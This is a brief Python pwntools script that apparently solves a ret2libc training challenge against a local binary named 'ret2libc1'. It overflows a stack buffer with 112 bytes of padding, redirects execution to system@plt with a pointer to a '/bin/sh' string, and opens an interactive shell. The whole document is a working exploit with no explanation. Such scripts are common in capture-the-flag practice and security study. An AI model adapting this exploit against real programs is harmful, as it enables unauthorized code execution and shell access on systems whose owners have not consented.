from pwn import *

io = process("./ret2libc1")

systemplt = 134513760

binsh = 134514464

#payload = b'A'*112 + p32(systemplt) +  b'BBBB' + p32(binsh)

payload = flat(b'A'*112, systemplt, b'BBBB', binsh)

io.sendline(payload)

io.interactive()
